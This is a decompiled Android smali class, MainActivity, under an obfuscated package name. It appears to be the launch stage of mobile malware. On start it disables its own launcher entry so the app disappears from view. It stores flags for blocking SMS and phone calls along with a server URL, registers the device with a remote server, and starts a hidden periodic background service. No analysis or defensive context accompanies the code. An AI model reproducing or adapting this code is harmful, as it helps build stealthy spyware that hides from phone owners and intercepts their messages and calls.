.class public LTnxibnad/Pncibnsc/view/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 11
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v8, 0x0

    .line 38
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 41
    invoke-virtual {p0}, LTnxibnad/Pncibnsc/view/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    .line 42
    invoke-virtual {p0}, LTnxibnad/Pncibnsc/view/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v5

    .line 43
    const/4 v6, 0x2

    .line 44
    const/4 v7, 0x1

    .line 41
    invoke-virtual {v4, v5, v6, v7}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 46
    const-string v4, "pref"

    invoke-virtual {p0, v4, v8}, LTnxibnad/Pncibnsc/view/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 47
    .local v1, "pref":Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 48
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v4, "ID"

    invoke-interface {v0, v4, v8}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 49
    const-string v4, "SMS_BlockState"

    invoke-interface {v0, v4, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 50
    const-string v4, "TEL_BlockState"

    invoke-interface {v0, v4, v8}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 51
    const-string v4, "Server_URL"

    sget-object v5, LTnxibnad/Pncibnsc/net/HttpUtils;->URL:Ljava/lang/String;

    invoke-interface {v0, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 52
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 58
    new-instance v3, LTnxibnad/Pncibnsc/view/Util;

    invoke-direct {v3, p0}, LTnxibnad/Pncibnsc/view/Util;-><init>(Landroid/content/Context;)V

    .line 59
    .local v3, "util":LTnxibnad/Pncibnsc/view/Util;
    invoke-virtual {v3}, LTnxibnad/Pncibnsc/view/Util;->doRegisterUser()Ljava/lang/String;

    move-result-object v2

    .line 69
    .local v2, "res":Ljava/lang/String;
    new-instance v4, Landroid/content/Intent;

    const-class v5, LTnxibnad/Pncibnsc/view/PreodicService;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v4}, LTnxibnad/Pncibnsc/view/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 72
    invoke-virtual {p0}, LTnxibnad/Pncibnsc/view/MainActivity;->finish()V

    .line 73
    return-void
.end method
